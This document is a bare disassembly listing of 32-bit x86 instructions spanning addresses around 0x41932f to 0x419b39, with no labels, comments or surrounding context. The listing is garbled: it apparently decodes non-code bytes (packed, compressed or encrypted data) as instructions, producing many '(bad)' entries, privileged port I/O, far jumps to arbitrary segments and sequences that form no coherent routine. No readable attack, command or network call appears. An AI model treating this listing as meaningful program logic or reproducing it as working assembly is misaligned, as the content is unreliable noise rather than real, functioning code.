  41932f:	jne    0x419344
  419331:	push   0x4ea7178b
  419336:	jnp    0x41936e
  419338:	xchg   esp,eax
  419339:	js     0x419309
  41933b:	leave  
  41933c:	cdq    
  41933d:	dec    ecx
  41933e:	in     al,dx
  41933f:	dec    ecx
  419340:	es add eax,0xce57645c
  419346:	xor    eax,0x7eef4ecd
  41934b:	inc    DWORD PTR [ebp-0x65]
  41934e:	mov    DWORD PTR [ebp+0x56],edx
  419351:	sbb    eax,0x9524f872
  419356:	lods   eax,DWORD PTR ds:[esi]
  419357:	lds    ebx,FWORD PTR [eax+0x7a]
  41935a:	je     0x419377
  41935c:	inc    edi
  41935d:	int3   
  41935e:	or     ecx,DWORD PTR [eax]
  419360:	daa    
  419361:	pop    ebx
  419362:	pop    eax
  419363:	jmp    0x419348
  419365:	aad    0x50
  419367:	stos   DWORD PTR es:[edi],eax
  419368:	or     al,0xd2
  41936a:	ja     0x4193b2
  41936c:	out    dx,eax
  41936d:	in     al,dx
  41936e:	mov    ah,0xfa
  419370:	out    0x9b,eax
  419372:	dec    ecx
  419373:	iret   
  419374:	cmp    ah,dl
  419376:	push   ecx
  419377:	xchg   edi,eax
  419378:	retf   0x2048
  41937b:	cmp    al,0xae
  41937d:	push   esp
  41937e:	mov    BYTE PTR [esi+eiz*2+0x58],cl
  419382:	ins    DWORD PTR es:[edi],dx
  419383:	mov    ecx,0xcc7f2414
  419388:	in     al,0x51
  41938a:	push   cs
  41938b:	sub    al,0xf6
  41938d:	xchg   ecx,ecx
  41938f:	mov    ?,WORD PTR [eax+esi*2-0x467cc300]
  419396:	ins    BYTE PTR es:[edi],dx
  419397:	mov    WORD PTR ds:0xbade39c3,gs
  41939d:	stc    
  41939e:	int3   
  41939f:	test   DWORD PTR [eax+esi*8+0x3a1ae172],eax
  4193a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193a7:	sub    bh,bh
  4193a9:	pop    ss
  4193aa:	add    al,0xaf
  4193ac:	outs   dx,DWORD PTR es:[esi]
  4193ae:	test   eax,0xb36c5773
  4193b3:	mov    ds:0x2aaaaceb,al
  4193b8:	mov    bh,0xe4
  4193ba:	add    eax,DWORD PTR [ebx+0x5c25cb0c]
  4193c0:	xor    BYTE PTR [eax-0x13eb1d60],cl
  4193c6:	jge    0x4193d2
  4193c8:	retf   0xb9f4
  4193cb:	popa   
  4193cc:	fsub   QWORD PTR [ebp-0x42211072]
  4193d2:	test   eax,0xfbfa9be4
  4193d7:	pop    edx
  4193d8:	test   DWORD PTR [ecx+esi*2-0x47],0x554d737
  4193e0:	sbb    al,0x2d
  4193e2:	jne    0x419456
  4193e4:	adc    esp,DWORD PTR [ebx]
  4193e6:	packssdw mm6,QWORD PTR [edi]
  4193e9:	stos   DWORD PTR es:[edi],eax
  4193ea:	jmp    0xca52:0x3be5617f
  4193f1:	into   
  4193f2:	push   es
  4193f3:	mul    bh
  4193f5:	add    bh,0x75
  4193f8:	xor    al,0x18
  4193fa:	mov    ebx,0xb7d698e7
  4193ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419400:	adc    dh,bl
  419402:	daa    
  419403:	xchg   esp,eax
  419404:	mov    esp,0x5698a841
  419409:	jp     0x419458
  41940b:	ret    
  41940c:	fwait
  41940d:	mov    esi,0x66dc62fd
  419412:	adc    BYTE PTR gs:[eax+0x1d9ceb52],ch
  419419:	aaa    
  41941a:	xor    eax,0x7904aaf3
  41941f:	mov    ch,0xde
  419421:	lods   eax,DWORD PTR fs:[esi]
  419423:	or     BYTE PTR [esi],ch
  419425:	inc    ebp
  419426:	enter  0xc0c2,0x3c
  41942a:	mov    edi,0x3ad1c549
  41942f:	(bad)  
  419430:	stos   DWORD PTR es:[edi],eax
  419431:	rcl    BYTE PTR ds:0xe4cd6429,cl
  419437:	(bad)  
  419438:	cmp    ebp,DWORD PTR [eax]
  41943a:	xlat   BYTE PTR ds:[ebx]
  41943b:	or     BYTE PTR [esi-0x53],ah
  41943e:	mov    eax,ds:0x24c91244
  419443:	or     al,0xeb
  419445:	mov    eax,ds:0x723a6782
  41944a:	sub    al,BYTE PTR [edx+0x60]
  41944d:	stc    
  41944e:	cmp    ecx,DWORD PTR [edx-0x14]
  419451:	mov    esi,DWORD PTR [ebx-0x52ed182c]
  419457:	fwait
  419458:	lock pusha 
  41945a:	dec    esp
  41945b:	cli    
  41945c:	xchg   edx,eax
  41945d:	shl    cl,1
  41945f:	sbb    cl,ch
  419461:	jmp    0xbeaa:0x95b6fda5
  419468:	mov    eax,ss:0xbf80459a
  41946e:	imul   esp,esp,0x11
  419471:	shl    BYTE PTR [edi+0x2b18974],1
  419477:	pop    ebx
  419478:	mov    BYTE PTR [esi],cl
  41947a:	add    dl,al
  41947c:	adc    ch,ah
  41947e:	sbb    eax,0xce9224a
  419483:	pop    ds
  419484:	jg     0x4194f2
  419486:	lea    edi,[edi+0x6b]
  419489:	sahf   
  41948a:	mov    bl,0x89
  41948c:	adc    eax,0x10193dd1
  419491:	or     eax,0xfc0ea739
  419496:	jle    0x419475
  419498:	dec    edx
  419499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41949a:	mov    esi,DWORD PTR [ecx]
  41949c:	mov    eax,0xd19278c5
  4194a1:	jmp    0x419490
  4194a3:	dec    edx
  4194a4:	adc    BYTE PTR [esp+eax*4],dl
  4194a7:	repz jp 0x419440
  4194aa:	out    dx,eax
  4194ab:	inc    ebx
  4194ac:	mov    WORD PTR [ecx+0x19],cs
  4194af:	std    
  4194b0:	int    0xae
  4194b2:	sbb    bh,dh
  4194b4:	jbe    0x419517
  4194b6:	popf   
  4194b7:	mov    ebx,DWORD PTR [ebx-0x73]
  4194ba:	push   esp
  4194bb:	das    
  4194bc:	xor    BYTE PTR [edi-0x3a2711c9],dl
  4194c2:	out    0x47,eax
  4194c4:	enter  0x12f9,0xd7
  4194c8:	lods   al,BYTE PTR ds:[esi]
  4194c9:	mov    ebx,0x281fd37
  4194ce:	jmp    0x301860d2
  4194d3:	jp     0x4194b3
  4194d5:	int    0x30
  4194d7:	mov    al,ds:0x8267cf1b
  4194dc:	sbb    DWORD PTR [edi],eax
  4194de:	push   ebx
  4194df:	jecxz  0x419468
  4194e1:	inc    esi
  4194e2:	xchg   esp,eax
  4194e3:	mov    esp,0x51d1a873
  4194e8:	push   ecx
  4194e9:	test   BYTE PTR [esi+0x4ccdf364],0x98
  4194f0:	xor    al,0x22
  4194f2:	push   esi
  4194f3:	add    ah,BYTE PTR [esi+edx*4+0x2a183447]
  4194fa:	loopne 0x419557
  4194fc:	sahf   
  4194fd:	jae    0x41953b
  4194ff:	xchg   edx,eax
  419500:	scas   eax,DWORD PTR es:[edi]
  419501:	test   eax,0x804fe78d
  419506:	repnz xchg ebx,eax
  419508:	aaa    
  419509:	ret    
  41950a:	sti    
  41950b:	pop    edi
  41950c:	hlt    
  41950d:	add    DWORD PTR [edx+0x34535bbc],esp
  419513:	add    al,0xb0
  419515:	push   es
  419516:	(bad)  
  41951a:	inc    ecx
  41951b:	dec    ebp
  41951c:	div    eax
  41951e:	fild   QWORD PTR [edi+0x51]
  419521:	dec    edx
  419522:	popa   
  419523:	enter  0x5e40,0xb7
  419527:	xor    eax,0x65edd2ae
  41952c:	in     al,0x8c
  41952e:	mov    ebp,0x34f89a6e
  419533:	xor    DWORD PTR [edi],edi
  419535:	mov    BYTE PTR [ecx],ch
  419537:	dec    eax
  419538:	push   es
  419539:	pop    DWORD PTR [ecx-0x4c]
  41953c:	mov    edx,0xbec4d963
  419541:	sti    
  419542:	sub    DWORD PTR [esi+0x6a4b4b63],0xffffffb6
  419549:	sti    
  41954a:	dec    ebp
  41954b:	jge    0x419573
  41954d:	xchg   ecx,eax
  41954e:	inc    ecx
  41954f:	dec    ebx
  419550:	aam    0xbf
  419552:	jo     0x419574
  419554:	test   eax,0x415c1956
  419559:	ja     0x41955a
  41955b:	stos   DWORD PTR es:[edi],eax
  41955c:	lahf   
  41955d:	jnp    0x419554
  41955f:	mov    esp,0x52b19d53
  419564:	int3   
  419565:	das    
  419566:	jmp    0xde75:0xa413e704
  41956d:	cmp    al,0x96
  41956f:	mov    eax,ds:0x74dae3cf
  419574:	sbb    edx,ecx
  419576:	je     0x4195b8
  419578:	daa    
  419579:	cmp    eax,0xcdf829ee
  41957e:	sub    eax,0x281a0ddc
  419583:	mov    eax,ds:0x17f236ab
  419588:	loop   0x419586
  41958a:	lock popf 
  41958c:	lahf   
  41958d:	inc    ebp
  41958e:	hlt    
  41958f:	inc    esi
  419590:	lods   al,BYTE PTR ds:[esi]
  419591:	xor    DWORD PTR [edx-0x77b33fee],esp
  419597:	jmp    0x9572:0xa0a1b089
  41959e:	inc    eax
  41959f:	push   0x8b0d3be8
  4195a4:	sbb    BYTE PTR [ebx+0x6bd114bb],ah
  4195aa:	fdivr  QWORD PTR [edi-0x4]
  4195ad:	add    BYTE PTR [eax],dl
  4195af:	inc    esp
  4195b0:	mov    DWORD PTR [edi-0x6e],ebx
  4195b3:	and    DWORD PTR [ebx-0x50],ebp
  4195b6:	push   esp
  4195b7:	push   esp
  4195b8:	fisub  WORD PTR [eax+0x3]
  4195bb:	in     al,0xf2
  4195bd:	js     0x419551
  4195bf:	jg     0x419607
  4195c1:	add    al,0xbf
  4195c3:	dec    ebp
  4195c4:	push   esi
  4195c5:	inc    ecx
  4195c6:	pop    sp
  4195c8:	cwde   
  4195c9:	pop    ebp
  4195ca:	dec    esp
  4195cb:	popa   
  4195cc:	test   eax,0x5e1e52f3
  4195d1:	je     0x419641
  4195d3:	add    ch,bh
  4195d5:	loopne 0x4195e3
  4195d7:	mov    dh,BYTE PTR [ebp-0x4b]
  4195da:	(bad)  
  4195db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195dc:	push   ecx
  4195dd:	adc    eax,DWORD PTR [ebp+0x13dc539]
  4195e3:	mov    gs,WORD PTR [ecx-0x28]
  4195e6:	clc    
  4195e7:	mov    ds:0x9540eaea,al
  4195ec:	mov    ebp,0xf037101f
  4195f1:	call   0x7d328e2b
  4195f6:	and    ebp,DWORD PTR [ebx-0x60]
  4195f9:	and    ax,0xe4dc
  4195fd:	and    BYTE PTR es:[esi+0x633edcc9],cl
  419604:	in     eax,0x20
  419606:	jne    0x419675
  419608:	cmp    bl,dl
  41960a:	lahf   
  41960b:	jl     0x419616
  41960d:	les    eax,FWORD PTR [ecx+0x14f4a342]
  419613:	pop    ds
  419614:	dec    edi
  419615:	mov    eax,ds:0x64b40276
  41961a:	or     al,0x74
  41961c:	sub    bl,BYTE PTR [edi+edx*8-0x2b]
  419620:	aaa    
  419621:	adc    BYTE PTR [ebp-0x2e],dl
  419624:	fisttp DWORD PTR ds:0x5d45351e
  41962a:	ret    0x2c44
  41962d:	fwait
  41962e:	das    
  41962f:	sbb    al,0xe4
  419631:	inc    esi
  419632:	aad    0x28
  419634:	push   esp
  419635:	in     eax,dx
  419636:	xor    edx,DWORD PTR [eax+0x5ce3a28c]
  41963c:	sbb    eax,DWORD PTR [esi+eax*1]
  41963f:	push   ss
  419640:	(bad)  
  419644:	sti    
  419645:	pop    ds
  419646:	(bad)  
  419647:	ficomp WORD PTR [edi+0x2c768504]
  41964d:	push   0xffffffa2
  41964f:	push   0x5069abe3
  419654:	lea    ebp,[ecx+0x2a61e35d]
  41965a:	int3   
  41965b:	mov    al,0xb7
  41965d:	push   esp
  41965e:	mul    esp
  419660:	xor    eax,0x6f3bee2b
  419665:	cmp    al,0xa3
  419667:	aam    0x32
  419669:	call   0x7b4a4497
  41966e:	dec    edi
  41966f:	add    eax,0x34ea2b0c
  419674:	sub    dl,ch
  419676:	jp     0x4196d5
  419678:	cmp    eax,0x9e7e760f
  41967d:	sbb    BYTE PTR [ebx-0x24],0x6
  419681:	add    eax,0x180949de
  419686:	popa   
  419687:	mov    al,ds:0x2f6db8f6
  41968c:	popfw  
  41968e:	aam    0xac
  419690:	(bad)  
  419692:	adc    eax,0xd85959dd
  419697:	cmp    cl,BYTE PTR [edi-0x38]
  41969a:	bnd jae 0x419703
  41969d:	jo     0x419644
  41969f:	scas   eax,DWORD PTR es:[edi]
  4196a0:	mov    bl,0x62
  4196a2:	or     DWORD PTR [ecx+ecx*8-0xcf9668d],0x4a
  4196aa:	xor    DWORD PTR [ebp+0x7a],0xffffffc2
  4196ae:	rcl    BYTE PTR [edi+esi*8],1
  4196b1:	mov    edi,0xc6bd4978
  4196b6:	push   ebx
  4196b7:	add    al,0xc3
  4196b9:	push   es
  4196ba:	adc    al,0xf9
  4196bc:	xor    esi,ecx
  4196be:	jecxz  0x419714
  4196c0:	fldcw  WORD PTR [ebp-0x3]
  4196c3:	xor    ah,ch
  4196c5:	ss cli 
  4196c7:	ins    BYTE PTR es:[edi],dx
  4196c8:	out    dx,al
  4196c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196ca:	imul   ebp,DWORD PTR [ebx],0x85d83c58
  4196d0:	cmp    esp,DWORD PTR [ecx+0x69]
  4196d3:	outs   dx,BYTE PTR ds:[esi]
  4196d4:	mov    cl,ah
  4196d6:	jecxz  0x419732
  4196d8:	sbb    DWORD PTR [ebx],0xfffffff7
  4196db:	repz inc eax
  4196dd:	add    BYTE PTR [ecx-0x4e91932a],ah
  4196e3:	(bad)  [ebx-0x2]
  4196e6:	push   0xffffffed
  4196e8:	out    0x28,eax
  4196ea:	dec    edx
  4196eb:	fdiv   DWORD PTR [esi]
  4196ed:	jno    0x4196b7
  4196ef:	mov    al,0xe9
  4196f1:	dec    ebp
  4196f2:	aas    
  4196f3:	pusha  
  4196f4:	les    edi,FWORD PTR [ebx+ebx*2]
  4196f7:	or     BYTE PTR [eax+esi*2+0xd5ecd22],0xf7
  4196ff:	lahf   
  419700:	ds in  al,dx
  419702:	xchg   ecx,eax
  419703:	mov    BYTE PTR [edx],ch
  419705:	popf   
  419706:	nop
  419707:	scas   eax,DWORD PTR es:[edi]
  419708:	sbb    DWORD PTR [ebx],edi
  41970a:	(bad)  
  41970c:	pop    ebp
  41970d:	sbb    al,0x24
  41970f:	jo     0x41975e
  419711:	das    
  419712:	jmp    0xd97e0e0c
  419717:	call   0xeeefccb9
  41971c:	adc    esi,DWORD PTR [ecx]
  41971e:	pop    esp
  41971f:	call   0xf32ea9e8
  419724:	std    
  419725:	leave  
  419726:	add    eax,0xb0ba3333
  41972b:	fdivp  st(5),st
  41972d:	pop    ss
  41972e:	imul   edx,DWORD PTR [ebx+0x6d],0x25
  419732:	and    edi,DWORD PTR [eax]
  419734:	jge    0x4196f7
  419736:	fmul   DWORD PTR [ebx]
  419738:	adc    eax,0x701636eb
  41973d:	add    bh,BYTE PTR [eax]
  41973f:	pop    edi
  419740:	arpl   WORD PTR [ecx-0x3c6e3d42],cx
  419746:	bound  eax,QWORD PTR [ebx-0x5a]
  419749:	call   0xfc09:0x22b5599b
  419750:	xor    edi,DWORD PTR [esi-0x6e]
  419753:	mov    edi,0x9c8da6d5
  419758:	cmp    ebx,DWORD PTR [ebx]
  41975a:	or     esp,DWORD PTR [ecx-0x40]
  41975d:	repnz adc cl,BYTE PTR [ebp+0x41]
  419761:	inc    ecx
  419762:	call   0xad03:0xf290dc1f
  419769:	ss push es
  41976b:	dec    edi
  41976c:	xor    ch,dh
  41976e:	adc    eax,0x45a1fee8
  419773:	push   ds
  419774:	outs   dx,DWORD PTR ds:[esi]
  419775:	bound  esp,QWORD PTR [edx-0x42]
  419778:	sub    bh,BYTE PTR [esi-0x42]
  41977b:	sub    DWORD PTR [esi+0x33],0x2b9bf9a2
  419782:	and    BYTE PTR [ecx+0x60],bh
  419785:	arpl   ax,cx
  419787:	xor    DWORD PTR [ecx],edi
  419789:	and    esi,edx
  41978b:	xchg   BYTE PTR [ebx],bl
  41978d:	and    bh,ch
  41978f:	push   esi
  419790:	push   0x3845305
  419795:	add    BYTE PTR [edx+0x4f],dl
  419798:	pushf  
  419799:	aas    
  41979a:	or     ebx,DWORD PTR [edx+0x4c]
  41979d:	cwde   
  41979e:	add    DWORD PTR [edx+edi*1],ebp
  4197a1:	(bad)  
  4197a2:	mov    ecx,DWORD PTR [edi+0x6009df63]
  4197a8:	adc    eax,0x5fa2052f
  4197ad:	ins    DWORD PTR es:[edi],dx
  4197ae:	dec    ecx
  4197af:	mov    bh,0xca
  4197b1:	push   0x3b93d3bf
  4197b6:	or     bh,BYTE PTR [esi-0x3633668c]
  4197bc:	cs (bad) 
  4197be:	in     al,dx
  4197bf:	aaa    
  4197c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197c1:	adc    al,0xac
  4197c3:	aas    
  4197c4:	xor    DWORD PTR [esi-0x65d5b5d6],ebx
  4197ca:	cmc    
  4197cb:	mov    ebp,ds
  4197cd:	or     ah,BYTE PTR [edi+eax*4+0x3e]
  4197d1:	push   ebx
  4197d2:	add    eax,0xca24a4f2
  4197d7:	in     al,0x1d
  4197d9:	iret   
  4197da:	push   ss
  4197db:	adc    DWORD PTR [ecx+0x1c4da7fc],edi
  4197e1:	dec    eax
  4197e2:	test   dl,bh
  4197e4:	push   esp
  4197e5:	add    ah,BYTE PTR [ebx+ecx*1-0x1c]
  4197e9:	mov    eax,ds:0x6b7bb646
  4197ee:	xor    DWORD PTR ds:0x9c71c806,0x30
  4197f5:	in     eax,dx
  4197f6:	je     0x419832
  4197f8:	push   cs
  4197f9:	imul   ecx,DWORD PTR [esi],0xffffffb7
  4197fc:	xor    BYTE PTR [edi-0x67aefbe1],cl
  419802:	and    bh,dl
  419804:	jp     0x41985a
  419806:	jns    0x4197d2
  419808:	sbb    edi,DWORD PTR [ecx+0x3ab765b9]
  41980e:	shl    BYTE PTR [eax],0x7a
  419811:	test   DWORD PTR [ecx-0x4b],0x4fda8485
  419818:	ret    
  419819:	mov    esp,0x2930ee44
  41981e:	pop    DWORD PTR [edi-0x634a10bd]
  419824:	call   0xb779:0xab25220f
  41982b:	cmp    BYTE PTR [esi],ah
  41982d:	or     al,BYTE PTR [edi+0x649f8f1f]
  419833:	dec    esi
  419834:	(bad)  
  419835:	cli    
  419836:	imul   edx,DWORD PTR [edi+0x2df3d920],0x0
  41983d:	pop    ds
  41983e:	sti    
  41983f:	lea    ebx,[ebp+ebp*2-0x64d4da51]
  419846:	mov    DWORD PTR [eax+ebp*4-0x38],edx
  41984a:	fisttp DWORD PTR [ebx+0x3a98b81]
  419850:	int    0xef
  419852:	popa   
  419853:	mov    ebx,0xa45c921b
  419858:	clc    
  419859:	call   0xdd5b6c93
  41985e:	out    dx,al
  41985f:	in     al,0xfa
  419861:	or     al,0xb8
  419863:	add    ch,BYTE PTR [edx-0x2cbac196]
  419869:	call   0xc71b62e8
  41986e:	shl    BYTE PTR [eiz*8+0x2c9384a5],1
  419875:	mov    ds:0xb519ffdc,eax
  41987a:	imul   DWORD PTR [edx+edx*8]
  41987d:	jo     0x419824
  41987f:	mov    ds:0x4ad4158b,al
  419884:	lea    ebx,[edi+0x4b116cc5]
  41988a:	cmc    
  41988b:	dec    esp
  41988c:	add    DWORD PTR [esi],0x26
  41988f:	sub    dh,BYTE PTR [edx+esi*4+0x3566e473]
  419896:	sbb    bh,0xa
  419899:	mov    esi,DWORD PTR [esi-0x6025003b]
  41989f:	fdiv   DWORD PTR [ebx-0x38]
  4198a2:	jecxz  0x41989d
  4198a4:	test   BYTE PTR [esi+0x6f],dh
  4198a7:	or     dl,0xb2
  4198aa:	dec    esp
  4198ab:	idiv   DWORD PTR [ebp+0xc]
  4198ae:	fwait
  4198af:	inc    ebx
  4198b0:	mov    DWORD PTR [eax],esp
  4198b2:	mov    ebp,0xc6743fd0
  4198b7:	into   
  4198b8:	push   ecx
  4198b9:	rcr    BYTE PTR [ecx+esi*2],cl
  4198bc:	retf   0xc6ae
  4198bf:	mov    ds:0x99de8bd7,eax
  4198c4:	mov    ah,0xd
  4198c6:	jo     0x4198f7
  4198c8:	addr16 mov eax,0x129ce50a
  4198ce:	pop    es
  4198cf:	dec    ebx
  4198d0:	repnz cmp al,0x32
  4198d3:	mov    eax,DWORD PTR [ecx]
  4198d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198d6:	xor    al,0x8f
  4198d8:	dec    edx
  4198d9:	cmp    esp,DWORD PTR [ebx-0x6537b010]
  4198df:	sbb    dl,BYTE PTR [ecx+ebp*4-0x53]
  4198e3:	sbb    cl,BYTE PTR [eax+0x71]
  4198e6:	adc    eax,0xf132ea63
  4198eb:	xchg   edx,eax
  4198ec:	aad    0x7a
  4198ee:	sub    dl,bl
  4198f0:	push   ebx
  4198f1:	adc    BYTE PTR ds:0xc759a501,0xfd
  4198f8:	sahf   
  4198f9:	call   0x424e:0x83279fd5
  419900:	repnz xchg ebx,eax
  419902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419903:	fmul   QWORD PTR [edi+0x62ecf6c7]
  419909:	sahf   
  41990a:	jmp    0x4198d7
  41990c:	repz push 0x63
  41990f:	add    eax,0x6550d6e8
  419914:	pushf  
  419915:	xchg   ecx,eax
  419916:	cmp    dh,BYTE PTR [ebp+0x31dbbb5e]
  41991c:	or     BYTE PTR [ebx+0x7c],bl
  41991f:	sub    ah,BYTE PTR [ebx+0x2b]
  419922:	icebp  
  419923:	rcl    DWORD PTR [edx],cl
  419925:	mov    edx,0x993a054
  41992a:	dec    edi
  41992b:	xlat   BYTE PTR ds:[ebx]
  41992c:	scas   eax,DWORD PTR es:[edi]
  41992d:	scas   eax,DWORD PTR es:[edi]
  41992e:	mov    ecx,0x7ad00e3d
  419933:	fidivr WORD PTR [ebp+0x5c]
  419936:	sbb    eax,0x3592bc46
  41993b:	lahf   
  41993c:	or     DWORD PTR [ecx],esi
  41993e:	sti    
  41993f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419940:	cwde   
  419941:	lahf   
  419942:	fcomi  st,st(7)
  419944:	or     DWORD PTR [ebx],esp
  419946:	xor    al,0x6b
  419948:	sub    al,0xc4
  41994a:	sub    BYTE PTR [eax+ecx*8],dh
  41994d:	push   edi
  41994e:	enter  0x675a,0x33
  419952:	xor    cl,BYTE PTR [eax-0x6724062d]
  419958:	sti    
  419959:	jp     0x419989
  41995b:	mov    WORD PTR [ecx+0x8],es
  41995e:	out    dx,eax
  41995f:	into   
  419960:	inc    esp
  419961:	cli    
  419962:	clc    
  419963:	cmp    al,0x9e
  419965:	adc    dh,ah
  419967:	cmp    eax,0xc56cabae
  41996c:	mov    WORD PTR [ebx+0x38],es
  41996f:	pop    ds
  419970:	es dec esp
  419972:	jnp    0x419937
  419974:	adc    edx,DWORD PTR [esi+0x1f9f8a3d]
  41997a:	xchg   esi,eax
  41997b:	cmp    dh,BYTE PTR ds:0x73144baa
  419981:	mov    ds:0x847d66fb,al
  419986:	enter  0x2f6f,0x14
  41998a:	dec    eax
  41998b:	push   esi
  41998c:	out    dx,al
  41998d:	mov    edx,0x8356fbfd
  419992:	jnp    0x41994a
  419994:	gs int3 
  419996:	sbb    ebp,ebp
  419998:	(bad)  
  419999:	scas   al,BYTE PTR es:[edi]
  41999a:	scas   al,BYTE PTR es:[edi]
  41999b:	sti    
  41999c:	call   0xa3ba5262
  4199a1:	leave  
  4199a2:	lock inc edi
  4199a4:	bts    edi,0xa3
  4199a8:	xchg   ebx,eax
  4199a9:	into   
  4199aa:	pop    ebx
  4199ab:	jg     0x4199cf
  4199ad:	inc    edi
  4199ae:	in     al,dx
  4199af:	push   edx
  4199b0:	jo     0x419a06
  4199b2:	cli    
  4199b3:	imul   esp,DWORD PTR [ebp-0x22],0xfffffffa
  4199b7:	(bad)  
  4199b8:	(bad)  
  4199ba:	shl    DWORD PTR [ecx+0x3d],cl
  4199bd:	in     al,0x52
  4199bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199c0:	ficomp DWORD PTR [esi+0x32]
  4199c3:	jae    0x419959
  4199c5:	sbb    dl,BYTE PTR [edi+0x673f7061]
  4199cb:	cmp    BYTE PTR [ebx+0x60],al
  4199ce:	sahf   
  4199cf:	dec    ebp
  4199d0:	sbb    DWORD PTR [ebx+0x3f8cba88],eax
  4199d6:	or     edx,DWORD PTR [ebx]
  4199d8:	pop    esi
  4199d9:	add    BYTE PTR [esi+0x2d],0x45
  4199dd:	xchg   ecx,ecx
  4199df:	pop    ebp
  4199e0:	dec    esi
  4199e1:	mov    ebp,0x133b82a4
  4199e6:	mov    dl,0x32
  4199e8:	inc    edx
  4199e9:	ss xchg ecx,eax
  4199eb:	aad    0x2d
  4199ed:	clc    
  4199ee:	push   ss
  4199ef:	retf   0xaf18
  4199f2:	fnsave [esi-0x68]
  4199f5:	sub    al,0xff
  4199f7:	push   ebx
  4199f8:	push   edx
  4199f9:	jmp    0x2f368aee
  4199fe:	sbb    al,0x12
  419a00:	pop    ebx
  419a01:	or     DWORD PTR [edi],eax
  419a03:	mov    bh,0x3a
  419a05:	inc    ebp
  419a06:	or     eax,0x542bdc06
  419a0b:	push   ebp
  419a0c:	sbb    al,BYTE PTR [edx+0x6]
  419a0f:	out    dx,al
  419a10:	mov    edi,0x40005d4b
  419a15:	push   esi
  419a16:	pop    eax
  419a17:	inc    esp
  419a18:	push   esi
  419a19:	stc    
  419a1a:	pop    es
  419a1b:	add    al,0xe2
  419a1d:	js     0x4199b3
  419a1f:	in     al,dx
  419a20:	ins    BYTE PTR es:[edi],dx
  419a21:	and    esi,0xffffffee
  419a24:	and    eax,0xae02e649
  419a29:	sub    eax,0x402b8f2b
  419a2e:	jnp    0x4199d9
  419a30:	add    eax,DWORD PTR [ebp-0x30da0386]
  419a36:	pop    ss
  419a37:	aaa    
  419a38:	pop    ebp
  419a39:	or     BYTE PTR [edx+0x43074db1],dh
  419a3f:	xchg   edi,eax
  419a40:	jmp    0xfa8a:0xb752f4fc
  419a47:	aaa    
  419a48:	add    eax,DWORD PTR [ebp-0x6438607a]
  419a4e:	scas   al,BYTE PTR es:[edi]
  419a4f:	loopne 0x419a14
  419a51:	arpl   WORD PTR ds:0x4968cc30,cx
  419a57:	sub    ebx,DWORD PTR [eax]
  419a59:	jno    0x419aab
  419a5b:	out    dx,eax
  419a5c:	add    eax,DWORD PTR [esi-0x2b]
  419a5f:	gs adc edi,ecx
  419a62:	dec    edi
  419a63:	inc    edx
  419a64:	scas   al,BYTE PTR es:[edi]
  419a65:	pop    ds
  419a66:	mov    DWORD PTR [edx-0x71],0x59fe72c6
  419a6d:	out    0xe9,eax
  419a6f:	pop    edi
  419a70:	add    DWORD PTR [esi],ebp
  419a72:	outs   dx,DWORD PTR ds:[esi]
  419a73:	dec    esp
  419a74:	push   eax
  419a75:	mov    al,0x3c
  419a77:	push   es
  419a78:	add    ebp,DWORD PTR [edi-0x5fb777c2]
  419a7e:	lea    ecx,[esi-0x33]
  419a81:	dec    esp
  419a82:	in     al,dx
  419a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a84:	adc    DWORD PTR es:[edi+0x49],edx
  419a88:	jae    0x419a8e
  419a8a:	mov    esp,0xf3f8fa83
  419a8f:	outs   dx,DWORD PTR ds:[esi]
  419a90:	shl    al,0x25
  419a93:	jle    0x419a7d
  419a95:	push   ds
  419a96:	cmp    DWORD PTR [esi],esp
  419a98:	fbld   TBYTE PTR [eax+0x2]
  419a9b:	sbb    eax,0x8a37612
  419aa0:	pop    ebx
  419aa1:	das    
  419aa2:	das    
  419aa3:	fadd   QWORD PTR ds:0x967d25b5
  419aa9:	in     eax,0x17
  419aab:	sbb    BYTE PTR [esi+0x24],cl
  419aae:	imul   ecx,DWORD PTR [ecx],0x319ac95
  419ab4:	add    BYTE PTR [ebp-0x5b7188e1],0x39
  419abb:	nop
  419abc:	xchg   BYTE PTR [eax+0x29],cl
  419abf:	adc    BYTE PTR [esi-0x22ea1f64],al
  419ac5:	mov    cl,0xd1
  419ac7:	or     eax,0xba479c1b
  419acc:	imul   esi,DWORD PTR [ebp+0x6ca1306b],0xffffffb3
  419ad3:	out    dx,al
  419ad4:	xor    bh,BYTE PTR [ebp-0x50cb4f03]
  419ada:	enter  0x1272,0xd3
  419ade:	mov    fs,edx
  419ae0:	jno    0x419ade
  419ae2:	cmp    eax,0xa95444ee
  419ae7:	xchg   ebx,eax
  419ae8:	mov    cl,BYTE PTR [edx+0x5a20e27]
  419aee:	push   esi
  419aef:	jae    0x419a90
  419af1:	es retf 
  419af3:	scas   al,BYTE PTR es:[edi]
  419af4:	fwait
  419af5:	xchg   edi,eax
  419af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419af7:	loopne 0x419ac5
  419af9:	pop    edi
  419afa:	lahf   
  419afb:	dec    ecx
  419afc:	addr16 call 0x93a4b340
  419b02:	cmc    
  419b03:	xchg   esp,eax
  419b04:	jo     0x419ab2
  419b06:	lods   eax,DWORD PTR ds:[esi]
  419b07:	aad    0x3f
  419b09:	pop    ds
  419b0a:	bound  edx,QWORD PTR [ecx-0x7f8f8335]
  419b10:	pusha  
  419b11:	movaps xmm7,XMMWORD PTR [edi]
  419b14:	inc    edi
  419b15:	inc    BYTE PTR [ebx+ebx*1+0x14]
  419b19:	(bad)  
  419b1a:	mov    bh,0x72
  419b1c:	fs loopne 0x419ae6
  419b1f:	jae    0x419b09
  419b21:	jbe    0x419b40
  419b23:	stos   DWORD PTR es:[edi],eax
  419b24:	ins    BYTE PTR es:[edi],dx
  419b25:	mov    esi,0x86bf89bc
  419b2a:	ja     0x419b8e
  419b2c:	cmc    
  419b2d:	mov    BYTE PTR [edi-0xe],dh
  419b30:	(bad)  
  419b31:	call   0x12906c6c
  419b36:	repz and ah,al
  419b39:	xchg   edi,eax
